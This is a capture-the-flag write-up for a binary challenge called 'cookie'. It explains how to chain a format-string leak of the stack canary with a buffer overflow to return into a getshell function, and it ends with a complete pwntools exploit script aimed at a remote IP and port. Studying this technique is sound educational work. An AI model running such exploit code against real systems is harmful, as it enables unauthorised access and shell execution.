
---

# Cookie Challenge Writeup

## Vulnerability Analysis

The `vuln()` function contains two critical vulnerabilities combined with a loop that iterates twice:

1. **Format String Vulnerability**: `printf(local_78)` prints user input directly without format specifiers. This allows us to leak data from the stack.
2. **Buffer Overflow**: The buffer `local_78` is **104 bytes**, but the `read` function accepts **0x200 (512) bytes**.

These vulnerabilities are guarded by a **Stack Canary**. However, because the loop runs twice, we can use the first iteration to leak the canary and the second iteration to perform the buffer overflow while restoring the correct canary value.

## Exploit Steps

### 1. Leak the Stack Canary

In the first iteration of the loop, we send a format string payload to leak the canary value from the stack.

* **Payload**: `%21$p`
* *Note*: Offset 21 was identified as the canary location (values ending in `00` are typical for canaries).


* **Action**: Receive the output and parse the hex string to an integer.

### 2. Construct the Payload

In the second iteration, we construct a buffer overflow payload. We must carefully match the stack layout to overwrite the return address without triggering the stack smashing detector.

The layout is:

1. **Padding**: 104 bytes (To fill `local_78`).
2. **Canary**: 8 bytes (The leaked value from Step 1).
3. **Saved RBP**: 8 bytes (Padding/Junk).
4. **RET Gadget**: 8 bytes (Address of a `ret` instruction for Stack Alignment).
* *Why?* `system()` calls in modern GLIBC require the stack to be 16-byte aligned. If the exploit crashes inside `do_system` or `movaps`, a `ret` gadget aligns the stack.


5. **Return Address**: 8 bytes (Address of `getshell` function).

### 3. Execution

Sending the payload overwrites the return address. When `vuln()` returns, execution flow jumps to `getshell()`, executing `system("/bin/bash")`.

```python
payload = flat(
    b'A' * 104,           # Buffer padding
    canary_leak,          # Restore Canary
    b'B' * 8,             # Overwrite RBP
    0x00000000004005d6,   # Ret Gadget (Align Stack)
    elf.symbols['getshell'] # Win Function
)

```

## Exploit Script
Here is the final solution:

```python
from pwn import *

exe = './cookie'
elf = ELF(exe)
context.binary = elf
# p = process(exe)
p = remote("34.40.105.109",32470)
log.info("Phase 1: Leaking Canary with %21$p...")

p.sendline(b'%21$p')

p.recvuntil(b"0x")
canary_leak = int(p.recvline().strip(), 16)
log.success(f"Canary Leaked: {hex(canary_leak)}")

log.info("Phase 2: Overwriting Stack...")

padding = b'A' * 104

canary_payload = p64(canary_leak)
rbp_padding = b'a' * 8
win_address = p64(elf.symbols['getshell'])
simple_ret_gadget = p64(0x00000000004005d6)

payload = padding + canary_payload + rbp_padding + simple_ret_gadget + win_address

p.sendline(payload)
p.interactive()
```

---
